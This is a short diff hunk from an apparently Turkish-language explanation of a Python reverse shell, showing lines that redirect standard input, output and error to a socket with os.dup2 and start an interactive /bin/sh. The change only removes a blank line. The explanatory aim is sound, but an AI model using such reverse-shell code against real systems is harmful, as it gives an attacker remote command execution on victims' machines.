@@ -36,7 +36,6 @@ os.dup2(s.fileno(), 2)
 os.dup2(): Hedef makinedeki standart giriş (stdin), standart çıkış (stdout) ve hata çıkışı (stderr) dosya tanıtıcıları, soket dosya tanıtıcısına (s.fileno()) yönlendirilir. Bu, saldırganın komutları doğrudan terminal üzerinden yürütmesine olanak tanır.
 2.5. Kabuk Başlatma
 
-
 p = subprocess.call(["/bin/sh", "-i"])
 subprocess.call(): Yeni bir süreç başlatarak /bin/sh kabuğunu interaktif modda (-i) çalıştırır.
 3. Özet
